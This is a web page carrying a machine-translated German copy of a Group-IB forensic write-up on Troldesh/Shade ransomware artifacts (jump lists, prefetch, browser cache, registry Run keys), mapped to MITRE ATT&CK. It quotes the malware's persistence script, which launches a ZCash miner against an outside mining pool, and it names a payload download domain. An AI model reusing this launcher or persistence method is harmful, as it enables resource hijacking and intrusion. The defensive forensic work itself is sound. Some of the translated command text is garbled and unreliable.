<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üõ¢Ô∏è üîÖ üöæ Das ist alles, was nach Ihnen √ºbrig bleibt: forensische Artefakte der Troldesh-Ransomware (Shade) ‚ûø üèùÔ∏è üë©üèª‚Äçü§ù‚Äçüë®üèº</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Wenn Sie den Nachrichten folgen, wissen Sie wahrscheinlich von einem neuen gro√ü angelegten Angriff auf russische Unternehmen des Troldesh-Ransomware-V...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Das ist alles, was nach Ihnen √ºbrig bleibt: forensische Artefakte der Troldesh-Ransomware (Shade)</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/group-ib/blog/457592/"><img src="https://habrastorage.org/webt/tx/fa/y5/txfay55dbgafekaewi9vtxtv5nw.png" alt="Bild"><br><br>  Wenn Sie den <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Nachrichten</a> folgen, wissen Sie wahrscheinlich von einem neuen gro√ü angelegten Angriff auf russische Unternehmen des Troldesh-Ransomware-Virus (Shade), einem der beliebtesten Kryptolocker unter Cyberkriminellen.  Allein im Juni entdeckte Group-IB √ºber 1.100 Phishing-E-Mails von Troldesh, die im Auftrag von Mitarbeitern gro√üer Fluggesellschaften, Autoh√§ndler und Medien verschickt wurden. <br><br>  In diesem Artikel werden wir uns die forensischen Artefakte ansehen, die nach einem Shade / Troldesh-Angriff auf die Medien eines kompromittierten Ger√§ts gefunden werden k√∂nnen, und die von Angreifern verwendeten Taktiken und Techniken mit MITRE ATT &amp; CK vergleichen. <br><br>  <b>Gepostet</b> von <b>Oleg Skulkin</b> , f√ºhrender Forensiker bei Group-IB <br><a name="habracut"></a><br>  Troldesh, auch bekannt als Shade, XTBL, Trojan.Encoder.858, Da Vinci, No_more_ransome, ist ein Virus, der Dateien auf dem infizierten Ger√§t eines Benutzers verschl√ºsselt und ein L√∂segeld ben√∂tigt, um den Zugriff auf Informationen wiederherzustellen.  J√ºngste Kampagnen mit Troldesh haben gezeigt, dass jetzt nicht nur Dateien, sondern auch Cryptocurrency Miner verschl√ºsselt und Zugriffe auf Websites generiert werden, um den Verkehr und die Einnahmen aus Online-Werbung zu steigern. <br><br>  Als Troldeshs Aktivit√§ten bereits 2015 von Group-IB-Experten entdeckt wurden, stellten sie fest, dass der Virus Antivirenschutz-Tools erfolgreich umgangen hat.  Angreifer wechselten regelm√§√üig den ‚ÄûPacker‚Äú - ein Packerprogramm, das die Dateigr√∂√üe reduziert und das Erkennen und Umkehren erschwert -, weshalb Antivirenprogramme ihn h√§ufig √ºbersprangen.  Bis Ende 2018 wurde Troldesh zu einem der beliebtesten Viren und stieg zusammen mit RTM und Pony souver√§n in die Top 3 ein.  Experten von PaloAlto Networks berichteten, dass Troldesh nicht nur f√ºr russische Zwecke arbeitet - unter den von Ransomware betroffenen L√§ndern sind die USA, Japan, Indien, Thailand und Kanada. <br><br><h3>  Erstinfektionsvektor </h3><br>  In der Regel wird "Troldesh / Shade" √ºber Phishing-E-Mails mit sch√§dlichen Anh√§ngen verteilt, z. B. passwortgesch√ºtzte Archive mit sch√§dlichen JS-Dateien, nachdem der Cryptolocker ge√∂ffnet und gestartet wurde.  Was bedeutet das?  Es w√§re eine gute Idee, unsere Studie mit der Analyse der Spuren der √ñffnung solcher Archive zu beginnen.  Wo sind solche Spuren zu finden?  Nun, zum Beispiel in Sprunglisten: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/hh/k-/yp/hhk-ypo6ixpvwwayr35d2b_u1qg.png" alt="Bild alt"></div><br>  <i>Daten, die mit JLECmd aus der Datei 5f7b5f1e01b83767.automaticDestinations-ms extrahiert wurden</i> <i><br></i> <br>  Wir sehen also, dass der Benutzer das Archiv mit dem Namen "Passwort 11.rar √ºber Bestellung" ge√∂ffnet hat.  Aber wie kam er ins System?  Die Datei befindet sich im Download-Verzeichnis, h√∂chstwahrscheinlich wurde sie aus dem Internet heruntergeladen.  Werfen wir einen Blick auf den Browserverlauf: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/ws/bd/p_/wsbdp_7cry0lrxupqxpultymp3w.png" alt="Bild alt"></div><br>  <i>Mit dem Belkasoft Evidence Center aus der Datei WebCache01.dat extrahierte Daten</i> <i><br></i> <br>  Wie Sie sehen, wurde die Datei mit dem Microsoft Edge-Webbrowser heruntergeladen und im Download-Verzeichnis gespeichert.  Dar√ºber hinaus besuchte der Benutzer unmittelbar vor dem Download die Web-Mail-Site, sodass das Archiv per E-Mail empfangen wurde. <br>  Wir haben es also mit der g√§ngigsten Technik zu tun: T1193 - ‚ÄûSpearphishing Attachment‚Äú. <br><br><h3>  Schutzmechanismen starten und umgehen </h3><br>  Wenn wir in das Archiv schauen, finden wir eine JS-Datei mit einem fast identischen Namen.  Damit die Malware geladen wird und funktioniert, muss der Benutzer auf die angegebene Datei doppelklicken.  Danach startet "wscript.exe" die JS-Datei, die die sch√§dliche Datei von <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">mat.tradetoolsfx</a> [.] Com herunterl√§dt und <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">ausf√ºhrt</a> .  K√∂nnen wir irgendwelche Spuren davon auf der Festplatte finden?  Nat√ºrlich! <br><br>  Schauen wir uns die Prefetch-Datei wscript.exe an und konzentrieren uns dabei auf die Dateien, mit denen sie interagiert hat: <br>  &lt;...&gt; <br>  \ VOLUME {01d3dcb4976cd072-3a97874f} \ USERS \ 0136 \ APPDATA \ LOCAL \ MICROSOFT \ WINDOWS \ INETCACHE \ IE \ OEJ87644 \ 1C [1] .JPG <br>  \ VOLUME {01d3dcb4976cd072-3a97874f} \ USERS \ 0136 \ APPDATA \ LOCAL \ TEMP \ 7ZO84024637 \ BESTELLDETAILS A.JS. <br>  &lt;...&gt; <br>  Wir haben also zwei interessante Dateien.  Erstens kennen wir jetzt den Namen der JS-Datei, die sich im Archiv befand, und zweitens haben wir den Namen der heruntergeladenen Datei herausgefunden.  Es ist Zeit herauszufinden, wo es heruntergeladen wurde.  Werfen wir noch einmal einen Blick auf WebCache01.dat: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/1u/4v/9_/1u4v9_9f9ulw6w11yfm7ftvu-ns.png" alt="Bild alt"></div><br>  <i>Daten, die mit ESEDatabaseView aus WebCache01.dat abgerufen wurden</i> <i><br></i> <br>  Wenn wir den Inhalt des Feldes ResponseHeaders dekodieren, erhalten wir Folgendes: <br>  HTTP / 1.1 200 OK <br>  Inhaltstyp: Bild / JPEG <br>  Inhaltsl√§nge: 1300656 <br>  ETag: "5ced19b6-13d8b0" <br>  Strikte Transportsicherheit: H√∂chstalter = 31536000; <br>  Tats√§chlich ist dies keine JPG-Datei, sondern eine ausf√ºhrbare Datei, die eine Instanz von Shade entschl√ºsselt und startet. <br>  Mit welchen Techniken besch√§ftigen wir uns hier?  Skripterstellung (T1064), Benutzerausf√ºhrung (T1204) und Maskierung (T1036). <br><br><h3>  Systemstift </h3><br>  "Shade" verwendet eine eher triviale Methode zur Fixierung am System - den Registrierungsschl√ºssel "Software \ Microsoft \ Windows \ CurrentVersion \ Run" (T1060).  Wir wissen bereits, dass die sch√§dliche JS-Datei vom Benutzer "0136" ge√∂ffnet wurde. Schauen Sie sich also die entsprechende Datei "NTUSER.DAT" an: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/w-/q9/fd/w-q9fdff43kczyndmw7ak9xdgxg.png" alt="Bild alt"></div><br>  <i>Der vom Belkasoft Evidence Center erkannte Verriegelungsmechanismus im System</i> <i><br></i> <br>  Aber das ist noch nicht alles!  Weiter interessanter: <br><div style="text-align:center;"><img src="https://habrastorage.org/webt/gm/hl/mz/gmhlmzuplqi7rketrgukc_thomi.png" alt="Bild alt"></div><br>  <i>Der vom Belkasoft Evidence Center erkannte Verriegelungsmechanismus im System</i> <i><br></i> <br>  Wie Sie in der Abbildung sehen k√∂nnen, gibt es einen weiteren interessanten Eintrag, der auf C verweist: \ ProgramData \ SysWOW64 \ leWRX7w.cmd.  Mal sehen, was in dieser Datei enthalten ist: <br>  echo CreateObject ("Wscript.Shell"). F√ºhren Sie "" ^ &amp; WScript.Arguments (0) ^ &amp; "", 0, False&gt; "% TEMP% / pxNXSB.vbs" &amp;&amp; start / WAIT wscript.exe "% TEMP% aus /pxNXSB.vbs "" C: \ Benutzer \ 0136 \ AppData \ Roaming \ SOFTWA ~ 1 \ NHEQMI ~ 1.EXE -l eu1-zcash.flypool.org ‚àó 333 -u t1L9iBXyRgaYrQ5JSTSdstopV6pHtZ2Xdep.7B9 TEMP% \ pxNXSB.vbs " <br>  Wir haben also noch eine Datei.  Gemessen am Inhalt wird es von Angreifern verwendet, um die ZCash-Kryptow√§hrung abzubauen.  Selbst wenn das Opfer das L√∂segeld zahlt, werden die Ressourcen ihres Systems dennoch von Eindringlingen genutzt. <br><br><h3>  Die Folgen </h3><br>  Zuallererst ist ‚ÄûShade‚Äú ein Krypto-Schlie√üfach. Das erste, was auff√§llt, sind viele Dateien mit der Erweiterung ‚ÄûCRYPTED000007‚Äú, ‚ÄûRead Me‚Äú -Dateien sowie ‚Äûfrische‚Äú Hintergrundbilder auf Ihrem Desktop: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/xc/wd/pv/xcwdpvfzo6gdobpsq6yyuiwozmg.png" alt="Bild alt"></div><br>  Eine Datei mit diesem Bild befindet sich im Verzeichnis C: \ Benutzer \% Benutzername% \ AppData \ Roaming.  Mit welcher Ausr√ºstung haben wir es zu tun?  "Daten f√ºr Auswirkungen verschl√ºsselt" (T1486). <br>  Aber wie Sie bereits verstanden haben, ist ‚ÄûShade‚Äú kein gew√∂hnliches Krypto-Schlie√üfach.  Neben dem Cryptoclocker selbst haben wir auch einen Miner entdeckt, was bedeutet, dass es sich lohnt, eine andere Technik zu erw√§hnen - ‚ÄûResource Hijacking‚Äú. <br><br><h3>  MITRE ATT &amp; CK </h3><br>  Unsere Analyse ergab eine Reihe von Taktiken und Techniken der Shade-Distributoren. Fassen wir zusammen: <br><br><div class="scrollable-table"><table><tbody><tr><th>  ID </th><th>  Name </th><th>  Beschreibung </th></tr><tr><td>  <b>T1193</b> </td><td>  Spearphishing-Anhang </td><td>  Shade wird √ºber Phishing-E-Mails mit b√∂swilligen Anh√§ngen verteilt </td></tr><tr><td>  <b>T1204</b> </td><td>  Benutzerausf√ºhrung </td><td>  Die an die E-Mail angeh√§ngte JS-Datei aus dem Archiv muss vom Benutzer gestartet werden. </td></tr><tr><td>  <b>T1064</b> </td><td>  Skripting </td><td>  Angreifer verwenden JS-Dateien, um Malware herunterzuladen </td></tr><tr><td>  <b>T1036</b> </td><td>  Maskieren </td><td>  Heruntergeladene Malware-Dateien haben die Erweiterung "JPG" anstelle von "EXE". </td></tr><tr><td>  <b>T1060</b> </td><td>  Registrierungslaufschl√ºssel / Startordner </td><td>  "Shade" verwendet den Registrierungsschl√ºssel "Software \ Microsoft \ Windows \ CurrentVersion \ Run", um im System anzudocken </td></tr><tr><td>  <b>T1486</b> </td><td>  Daten f√ºr Auswirkungen verschl√ºsselt </td><td>  Shade verschl√ºsselt Dateien f√ºr L√∂segeld </td></tr><tr><td>  <b>T1496</b> </td><td>  Ressourcenentf√ºhrung </td><td>  Shade verwendet Computerressourcen des Opfers, um die Kryptow√§hrung abzubauen </td></tr></tbody></table></div></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de457592/">https://habr.com/ru/post/de457592/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de457576/index.html">KnowledgeConf - gestartet oder nicht?</a></li>
<li><a href="../de457578/index.html">Neuromorphe Systeme: Computer, die vom menschlichen Gehirn inspiriert sind</a></li>
<li><a href="../de457580/index.html">JavaScript: Erstellen einer einfachen MEVN-Anwendung</a></li>
<li><a href="../de457582/index.html">Schwei√ü, Tr√§nen und Zeiterfassung - wie wir die Rentabilit√§t des Unternehmens gesteigert haben</a></li>
<li><a href="../de457588/index.html">Barcamp - die erste √∂ffentliche Veranstaltung im Dorf</a></li>
<li><a href="../de457596/index.html">OSDay 19 oder warum die C-Sprache noch lebt</a></li>
<li><a href="../de457600/index.html">Headsets - √úbersicht Snom A150, Snom A100M und D.</a></li>
<li><a href="../de457602/index.html">Untersuchung der Leistung von DBMS MS SQL Server Developer 2016 und PostgreSQL 10.5 f√ºr 1C</a></li>
<li><a href="../de457606/index.html">Alan Kay: Was kann man als das Erstaunlichste bezeichnen, was Computer m√∂glich gemacht haben?</a></li>
<li><a href="../de457608/index.html">So visualisieren Sie Daten zu einer √ºberzeugenden Geschichte</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>